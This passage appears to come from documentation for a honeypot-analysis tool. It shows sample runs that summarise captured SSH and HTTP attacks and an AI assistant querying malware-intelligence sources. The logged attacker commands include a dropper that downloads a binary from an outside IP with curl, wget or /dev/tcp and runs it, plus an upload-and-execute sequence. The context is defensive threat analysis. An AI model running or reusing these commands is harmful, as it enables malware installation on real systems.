Attack (hhash: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae), SourceIPs: 5, Sessions: 279, HTTP: 18, Httplogs: 1 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
########################################################################################################################
#                                              most_common3_http_requests                                              #
########################################################################################################################
#                                                                                                                      #
# [("145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win "                       #
#   '7 Professional SP1 '                                                                                              #
#   "x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhL #
# mV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA= "                                                          #
#   'HTTP/
',                                                                                                         #
#   10),                                                                                                               #
#  ('GET / HTTP/1.0
', 4),                                                                                            #
#  ('  HTTP/1.1
', 4)]                                                                                                #
#                                                                                                                      #
########################################################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '66.240.205.34'    #
#                    #
######################

Attack (chash: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15), SourceIPs: 1, Sessions: 1053, SSH: 771, Commands: 29, Cmdlogs: 1, 
#################
# first_command #
#################
#               #
# 'uname -a'    #
#               #
#################
##############################
# most_common3_http_requests #
##############################
#                            #
# []                         #
#                            #
##############################
######################
# most_common_src_ip #
######################
#                    #
# '150.158.27.38'    #
#                    #
######################
...Truncated...    
Honeypot AI Finished Successfully!
````

</details>


> Load only attacks with IDs XXXX and YYYY from the attacks directory then print the source IPs, unique dst ports, sessions, commands, and malware for each attack

````bash
honeypot-ai/run.sh -lfa --only-attacks XXXX YYYY --print-attrs source_ips uniq_dst_ports sessions commands malware
````

<details>
<summary>
Output
</summary>


````
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attacks c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --print-attrs source_ips uniq_dst_ports sessions commands malware
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading 2 attacks in parallel with 2 workers.
WARNING: Output may be jumbled. If errors occur, try again with --load-attacks-max-workers 1
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x11302b810>
Loading Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10fc7f610>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11302bb50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10fda7850>
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Loaded Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
(4->4) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 36: b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f <- c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 by malware_urls
Merged 0 attacks by out of 36 attempts (0.0000%) 
Merge Attacks Time: 0.0058s
(4->4) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
(4->2) - Merged 2 attacks with shared sig regexes


Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 3, SSH: 2, Commands: 21, Cmdlogs: 1, 
#############################################################################################
#                                         source_ips                                        #
#############################################################################################
#                                                                                           #
# [SourceIP 47.120.37.43 Sessions: 3, Successful Logins: 1, Commands: 21, Zeek Events: 4, ] #
#                                                                                           #
#############################################################################################
##################
# uniq_dst_ports #
##################
#                #
# {2222}         #
#                #
##################
########################################################################################################################
#                                                       sessions                                                       #
########################################################################################################################
#                                                                                                                      #
# [Session CZTsog4mK2qlnX5z39 CONN 47.120.37.43:39554 -> 172.31.5.68:2222 Duration: 0.00s,                             #
#  Session ClTf1A34WgU8CTeDal SSH 47.120.37.43:37534 -> 172.31.5.68:2222 Duration: 0.00s,                              #
#  Session 3334db81db98 SSH 47.120.37.43:37534 -> 172.31.5.68:2222 Login: root:12345678 Commands: 21, Duration: 0.11s] #
#                                                                                                                      #
########################################################################################################################
########################################################################################################################
#                                                       commands                                                       #
########################################################################################################################
#                                                                                                                      #
# ['echo 1 && cat /bin/echo',                                                                                          #
#  'nohup $SHELL -c "curl http://108.181.122.221:60101/linux -o /tmp/1d0xrd25u0; '                                     #
#  'if [ ! -f /tmp/1d0xrd25u0 ]; then wget http://108.181.122.221:60101/linux -O '                                     #
#  '/tmp/1d0xrd25u0; fi; if [ ! -f /tmp/1d0xrd25u0 ]; then exec '                                                      #
#  "6<>/dev/tcp/108.181.122.221/60101 && echo -n 'GET /linux' >&6 && cat 0<&6 > "                                      #
#  '/tmp/1d0xrd25u0 && chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                                   #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==; '                                                                                                            #
#  'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                     #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==" '                                                                                                            #
#  '&',                                                                                                                #
#  'head -c 0 > /tmp/UVPRQdahjX',                                                                                      #
#  'chmod 777 /tmp/UVPRQdahjX',                                                                                        #
#  '/tmp/UVPRQdahjX '                                                                                                  #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==',                                                                                                             #
#  'cp /tmp/UVPRQdahjX /tmp/linux',                                                                                    #
#  'head -c 0 > /tmp/winminer_sign',                                                                                   #
#  'head -c 0 > /tmp/winminer',                                                                                        #
#  'head -c 0 > /tmp/linux_sign',                                                                                      #
#  'head -c 0 > /tmp/mipsel_linux_sign',                                                                               #
#  'head -c 0 > /tmp/mips_linux',                                                                                      #
#  'head -c 0 > /tmp/mips_linux_sign',                                                                                 #
#  'head -c 0 > /tmp/windows_sign',                                                                                    #
#  'head -c 0 > /tmp/arm_linux_sign',                                                                                  #
#  'head -c 0 > /tmp/miner',                                                                                           #
#  'head -c 0 > /tmp/mipsel_linux',                                                                                    #
#  'head -c 0 > /tmp/windows',                                                                                         #
#  'head -c 0 > /tmp/arm_linux',                                                                                       #
#  'head -c 0 > /tmp/miner_sign',                                                                                      #
#  '',                                                                                                                 #
#  'exit']                                                                                                             #
#                                                                                                                      #
########################################################################################################################
###########
# malware #
###########
#         #
# []      #
#         #
###########



Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 24, SSH: 20, Commands: 3, Cmdlogs: 4, Malware: 3 
#############################################################################################################
#                                                 source_ips                                                #
#############################################################################################################
#                                                                                                           #
# [SourceIP 93.223.169.159 Sessions: 10, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 14, , #
#  SourceIP 27.93.25.111 Sessions: 7, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 8, ,     #
#  SourceIP 111.216.194.148 Sessions: 7, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 8, ]  #
#                                                                                                           #
#############################################################################################################
##################
# uniq_dst_ports #
##################
#                #
# {22, 2222}     #
#                #
##################
########################################################################################################################
#                                                       sessions                                                       #
########################################################################################################################
#                                                                                                                      #
# [Session CmMj7Y1TLuJ5YCKDWl CONN 93.223.169.159:60702 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CTCt4bY4cLQCcH5Si SSH 93.223.169.159:47114 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session CnN1Ae1hMulVtjCKi6 SSH 93.223.169.159:47118 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session C06KgE3PnupO2F8u27 CONN 93.223.169.159:49808 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CQi9zfVW7vj47v0A9 SSH 93.223.169.159:46966 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session Cz65Bp3E9Yx7GOGZf8 SSH 93.223.169.159:46970 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session CkS27i1cg6LfTwb3Oi SSH 93.223.169.159:47004 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s,                                  #
#  Session fa6fb05e952d SSH 93.223.169.159:46970 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 1, Malware: 1, Dura #
# tion: 0.87s,                                                                                                         #
#  Session 3383f6a6a93c SSH 93.223.169.159:47004 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 2, Duration: 0.70s, #
#  Session C5rS7g4QnQp42gbcGd CONN 27.93.25.111:50916 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session CMy02v1pudNB2CRKZ7 SSH 27.93.25.111:52094 -> 172.31.5.68:22 Duration: 0.00s,                                #
#  Session CKKbJDBalq1TZbmF6 SSH 27.93.25.111:52102 -> 172.31.5.68:22 Duration: 0.00s,                                 #
#  Session CHGw7y4ZZUIK7GA6De SSH 27.93.25.111:52146 -> 172.31.5.68:22 Duration: 0.00s,                                #
#  Session CYkNc83gU5wuP2Slq2 CONN 111.216.194.148:49512 -> 172.31.5.68:22 Duration: 0.00s,                            #
#  Session CT4tTu4hPvKdx6ZkLe SSH 111.216.194.148:52912 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CLMsKD2iQhsMaDU1nk SSH 111.216.194.148:52922 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session C1Z4MD4DurN46YY8Ra SSH 111.216.194.148:52964 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session b183188057b3 SSH 27.93.25.111:52094 -> 172.31.5.68:2222 Duration: 0.15s,                                    #
#  Session a9ffcecc6796 SSH 27.93.25.111:52102 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1, Mal #
# ware: 1, Duration: 0.57s,                                                                                            #
#  Session 6c83f979e0b5 SSH 27.93.25.111:52146 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Dur #
# ation: 0.46s,                                                                                                        #
#  Session 617df930d4a6 SSH 111.216.194.148:52912 -> 172.31.5.68:2222 Duration: 0.09s,                                 #
#  Session c0a95962c75a SSH 111.216.194.148:52922 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1,  #
# Malware: 1, Duration: 0.52s,                                                                                         #
#  Session 9a98fb146784 SSH 111.216.194.148:52964 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2,  #
# Duration: 0.28s]                                                                                                     #
#                                                                                                                      #
########################################################################################################################
##########################################################
#                        commands                        #
##########################################################
#                                                        #
# ['scp -t /tmp/BUwTrLEj',                               #
#  'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', #
#  './BUwTrLEj']                                         #
#                                                        #
##########################################################
########################################################################################################################
#                                                       malware                                                        #
########################################################################################################################
#                                                                                                                      #
# [Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 93.223.169.159 Session fa6fb05e952d ,                                                          #
#  Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 27.93.25.111 Session a9ffcecc6796 ,                                                            #
#  Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 111.216.194.148 Session c0a95962c75a ]                                                         #
#                                                                                                                      #
########################################################################################################################

Honeypot AI Finished Successfully!
````

</details>


> Analyze attack with ID XXXX using OpenAI and OSINT analyzers then write markdown and export to reports directory

````bash
honeypot-ai/run.sh -lfa --only-attack XXXX --analyze --write --export
````

<details>
<summary>
Output
</summary>


````
honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --analyze --write --export
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x113bc8850>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x113d12590>
Processed 78 events (78 cowrie events, 0 zeek events). Found 3 source ips
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
(3->3) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 18: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 <- b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by malware_urls
Merged 0 attacks by out of 18 attempts (0.0000%) 
Merge Attacks Time: 0.0021s
(3->3) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
(3->1) - Merged 2 attacks with shared sig regexes
Analyzing 1 attacks.
Getting log paths and counts.
Getting ipdata.
Getting data for 93.223.169.159 from isc
Getting data for 93.223.169.159 from whois
Getting data for 93.223.169.159 from cybergordon
Getting data for 93.223.169.159 from threatfox
Getting data for 93.223.169.159 from shodan
Getting data for 27.93.25.111 from isc
Getting data for 27.93.25.111 from whois
Getting data for 27.93.25.111 from cybergordon
Getting data for 27.93.25.111 from threatfox
Getting data for 27.93.25.111 from shodan
Getting data for 111.216.194.148 from isc
Getting data for 111.216.194.148 from whois
Getting data for 111.216.194.148 from cybergordon
Getting data for 111.216.194.148 from threatfox
Getting data for 111.216.194.148 from shodan
Getting mwdata.
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from malwarebazaar
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from threatfox
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from malwarebazaar
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from threatfox
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from malwarebazaar
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from threatfox
Getting data for 93.223.169.159 from urlhaus
Getting data for 93.223.169.159 from threatfox
Getting data for 27.93.25.111 from urlhaus
Getting data for 27.93.25.111 from threatfox
Getting data for 111.216.194.148 from urlhaus
Getting data for 111.216.194.148 from threatfox
Getting command explanations.
Getting OpenAI resp for message_hash 554a34bd591c612a2521bf473e7956f391d627820a1c6816eb68f118d50b23b3
Writing 554a34bd591c612a2521bf473e7956f391d627820a1c6816eb68f118d50b23b3 to db
Getting malware explanations.
Getting OpenAI resp for message_hash 6b2c514d30f230de6cbb2a79a5b8ca783db9d1b9892742fc976489fb6b045eeb
Writing 6b2c514d30f230de6cbb2a79a5b8ca783db9d1b9892742fc976489fb6b045eeb to db
Getting assistant answers.

Asking: Explain what is known about the hosts, malware, and/or exploits used in the attack using data from MalwareBazaar, ThreatFox, URLhaus, and Malpedia. Be sure to analyze the src_ips, malware hashes, and any urls or hosts found in the malware samples, commands and/or HTTP requests.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: get_attack_attrs
with args: {'attrs': ['uniq_src_ips', 'uniq_malware']}

Submitting tool output: {'uniq_src_ips': {'93.223.169.159', '27.93.25.111', '111.216.194.148'}, 'uniq_malware': {Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c: Size: 4766 bytes Type: application/octet-stream Downloaded by: 93.223.169.159 Session fa6fb05e952d , Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51: Size: 4766 bytes Type: application/octet-stream Downloaded by: 27.93.25.111 Session a9ffcecc6796 , Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f: Size: 4766 bytes Type: application/octet-stream Downloaded by: 111.216.194.148 Session c0a95962c75a }}
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: get_malware_attrs
with args: {'malware_id': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}

AI called tool: get_malware_attrs
with args: {'malware_id': '1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': '1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}

AI called tool: get_malware_attrs
with args: {'malware_id': 'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': 'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Using saved threatfox data hash for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from urlhaus
ERROR: Error caught while getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from urlhaus: Invalid arg_type: hash

Submitting tool output: {'10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c': {'malwarebazaar': {'first_seen': '2022-07-16 05:08:48', 'file_name': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'file_size': 4766, 'file_type_mime': 'application/octet-stream', 'file_type': 'sh', 'delivery_method': 'other', 'intelligence': {'clamav_signatures': ['SecuriteInfo.com.PUA.Linux.AutorizedKeys-1.UNOFFICIAL'], 'times_downloaded_from_malwarebazaar': '83', 'times_uploaded_to_malwarebazaar': '1'}, 'vendor_intel': {'YOROI_YOMI': {'detection': 'Legit File', 'score': '0.00'}, 'InQuest': {'verdict': 'MALICIOUS'}, 'ReversingLabs': {'threat_name': 'Linux.Trojan.Generic', 'status': 'SUSPICIOUS', 'first_seen': '2021-05-12 07:07:18', 'scanner_count': '42', 'scanner_match': '27', 'scanner_percent': '64.29'}, 'Spamhaus_HBL': [{'detection': 'suspicious'}]}}, 'threatfox': '', 'urlhaus': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Using saved threatfox data hash for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from urlhaus
ERROR: Error caught while getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from urlhaus: Invalid arg_type: hash

Submitting tool output: {'1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51': {'malwarebazaar': '', 'threatfox': '', 'urlhaus': ''}}

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Using saved threatfox data hash for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from urlhaus
ERROR: Error caught while getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from urlhaus: Invalid arg_type: hash

Submitting tool output: {'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f': {'malwarebazaar': '', 'threatfox': '', 'urlhaus': ''}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Run run_viIztnmV7bEgeUEXfe28vZqi completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_viIztnmV7bEgeUEXfe28vZqi

 Done with: Explain what is known about the hosts, malware, and/or exploits used in the attack using data from MalwareBazaar, ThreatFox, URLhaus, and Malpedia. Be sure to analyze the src_ips, malware hashes, and any urls or hosts found in the malware samples, commands and/or HTTP requests.
